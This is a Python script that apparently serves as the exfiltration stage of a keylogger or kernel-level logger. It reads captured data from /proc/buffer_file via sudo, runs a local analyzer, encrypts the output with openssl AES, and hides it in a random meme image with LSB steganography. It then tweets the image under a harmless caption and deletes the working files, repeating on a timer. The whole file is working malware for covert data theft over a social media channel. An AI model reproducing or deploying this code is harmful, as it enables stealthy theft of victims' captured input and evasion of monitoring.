import os
import subprocess
import sys
import json
import random
import time
from io import BytesIO

try:
    import pip
except ImportError:
    os.system('sudo apt install python3-venv python3-pip')

def install(package):
    with open(os.devnull, 'w')  as FNULL:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package],stdout=FNULL,stderr=FNULL)
        except subprocess.CalledProcessError:
            # Do something
            print("error")

try:
    import tweepy
except ImportError:
    install("tweepy")
    import tweepy
try:
    from stegano import lsb
except ImportError:
    install("Stegano")
    from stegano import lsb

try:
    import PIL
except ImportError:
    install("Pillow")
    import PIL

try:
    import requests
except ImportError:
    install("requests")
    import requests

try:
    import tweepy
except ImportError:
    install("tweepy")
    import tweepy

def DownloadTrendingImages():
    headers = {'Content-Type': 'application/json'}
    api_url = config["MEME_GET_URL"]  
    response = requests.get(api_url, headers=headers)

    if response.status_code == 200:
        content = json.loads(response.content.decode('utf-8'))
        memes = content["data"]
        return memes["memes"]
    else:
        return None

def getImage():
    ImageSet = DownloadTrendingImages()
    ImageSize = int(config["IMAGE_SIZE"])
    #filter for correct image size
    newImageSet = []
    for image in ImageSet:
        if image["height"] >= ImageSize and image["width"] >= ImageSize:
            newImageSet.append(image)

    ImageSet_Size = len(newImageSet)

    #get one image
    if ImageSet_Size >= 1:
        Image = random.choice(newImageSet)
    else:
        #No image not returned
        Image = None
    #image url
    url = Image["url"]

    response = requests.get(url)
    if response.status_code == 200:
        content = response.content
        #return JPEG file
        return PIL.Image.open(BytesIO(content))
    else:
        return None


#hide message into image
def stenographizeImage(ImagePath,NewImagePath,Text):
    secret_image = lsb.hide(ImagePath,message=Text)
    secret_image.save(NewImagePath)

def encrypt(password, logged_file, encrypted_file):
    enc_scheme = "-aes-128-cbc"
    opts = "-a -A -nosalt"
    openssl_cmd = 'openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null '.format(password, enc_scheme, opts, logged_file, encrypted_file)

    try:
        os.system(openssl_cmd)
    except Exception as e:
        print(e)

def cleanup(files):
    for eaFile in files:
        if os.path.exists(eaFile):
            os.remove(eaFile)

# tweet image
def tweetSetup():
    consumer_key = config["TWITTER_CONSUMER_KEY"]
    consumer_key_secret = config["TWITTER_CONSUMER_KEY_SECRET"]
    access_token = config["TWITTER_ACCESS_TOKEN"]
    access_token_secret = config["TWITTER_ACCESS_TOKEN_SECRET"]

    auth = tweepy.OAuthHandler(consumer_key, consumer_key_secret)
    auth.set_access_token(access_token, access_token_secret)
    return tweepy.API(auth)

def tweetImage(tw_api, image_path, tw_text="I love lemons"):
    im_handler = tw_api.media_upload(image_path)
    media_ids = [im_handler.media_id_string]
    status = tw_api.update_status(tw_text, media_ids=media_ids,source="random user")

def sendStegoTweet():

    """
    Image size of 600x600 = 360,000 pixels
    Each byte of ASCII character can be encoded into 3 pixels
    Bytes of ascii = 360,000 / 3 = 120,000 bytes
    120,000 bytes = 117kB of text into image

    Gets image from meme generator

    """
    image_name = "test_image"
    ImagePath = './{}.png'.format(image_name)
    NewImagePath = './{}_new.png'.format(image_name)

    JPEG_IMG = getImage()
    ImageSize = int(config["IMAGE_SIZE"])
    JPEG_IMG = JPEG_IMG.resize((ImageSize,ImageSize))
    JPEG_IMG.save(ImagePath)
    PNG_IMAGE = PIL.Image.open(ImagePath)
    width, height = PNG_IMAGE.size
    image_text_storage = (width * height)//3 #number of ASCII character that is storable

    logged_file = "log_file_analyzed.txt"
    encrypted_file = "encrypted.txt"
    password = config["AES_PASSWORD"]

    encrypt(password, logged_file, encrypted_file)

    with open(encrypted_file,'rb') as encrypted_text:
        message = str(encrypted_text.read())
        if image_text_storage > len(message):
            stenographizeImage(ImagePath,NewImagePath,message)
            tw_api = tweetSetup()
            tweetImage(tw_api, NewImagePath)

    files = [ImagePath, NewImagePath, logged_file, encrypted_file]
    cleanup(files)


def check_log_file():

    EXPECTED_SIZE_LOGFILE = 10
    try:
        os.system('sudo cat /proc/buffer_file 2>/dev/null > log_file.txt')
    except Exception:
        print("check log file has failed")
        return False 
    
    #returns size of file in bytes. Or num characters in file since one character is 1 byte
    log_file_size = os.stat('log_file.txt').st_size

    #check if file size is significant, if the file size if significant then we continue analysing it
    if log_file_size > EXPECTED_SIZE_LOGFILE:
        return check_analyzed_log_file()
    else:
        return False



#checks whether data is significant
def check_analyzed_log_file():
    EXPECTED_SIZE_ANALYSED_LOGFILE = 10

    try:
        os.system('./analyze')
    except Exception:
        print("fail analyzing file")
        return False 
    
    analysed_file_size = os.stat('log_file_analyzed.txt').st_size

    if analysed_file_size > EXPECTED_SIZE_ANALYSED_LOGFILE:
        return True
    else:
        return False


#returns a dictionary key value pair
#containing configuration data
def getConfig():
    config = {} 
    with open('config','r') as config_file: 
        for line in config_file:
            if line == '\n':
                continue
            line = line.replace("="," ")
            pairs = line.split()
            key = pairs[0]
            value = pairs[1]
            config[key] = value
    return config


def main_scheduler(): 
    minutes = int(config["SCHEDULER_MINUTE_CYCLE"])
    REPEAT_EVERY = 60 * minutes # secs/min * minutes
    while True:
        print(config.values())
        #first we retrieve log file from /proc/buffer_file
        #check if enough data in log file. if yes continue, if not try again in 30 mins

        #if continue to next phase retrieve procfile and analyse data 
        #check if enough data in analysed log file. if yes continue to tweet, if not try again in 30 mins
        should_continue_to_tweet = check_log_file() 
        

        #if everything good then we send as tweet 
        #repeat process again after that
        
        if(should_continue_to_tweet):
            print("stego tweet sent")
            #uncomment for actually sending tweet
            sendStegoTweet()
        else:
            print("not tweet")

        time.sleep(REPEAT_EVERY)    


config = getConfig()
main_scheduler()
    
